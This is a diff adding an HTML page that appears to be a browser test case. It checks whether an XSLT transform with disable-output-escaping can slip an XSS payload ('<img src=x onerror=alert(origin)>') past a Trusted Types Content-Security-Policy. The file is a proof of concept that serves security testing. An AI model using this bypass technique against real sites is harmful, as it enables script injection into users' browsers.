@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types 'none';">
+</head>
+<body>
+  <script>
+    let attackerControlledString = '<img src=x onerror=alert(origin)>';
+    const doc = document.implementation.createHTMLDocument();
+    const xslt = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:stylesheet');
+    xslt.setAttribute('xmlns:xsl', 'http://www.w3.org/1999/XSL/Transform');
+    const template = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:template');
+    template.setAttribute('match', '/');
+    const output = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:output');
+    output.setAttribute('method', 'html');
+    xslt.appendChild(output);
+    const text = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:text');
+    text.textContent = attackerControlledString;
+    text.setAttribute('disable-output-escaping', 'yes');
+    template.appendChild(text);
+    xslt.appendChild(template);
+    const processor = new XSLTProcessor();
+    processor.importStylesheet(xslt);
+    const fragment = processor.transformToFragment(doc,document);
+    document.body.appendChild(fragment);
+  </script>
+</body>
+</html>
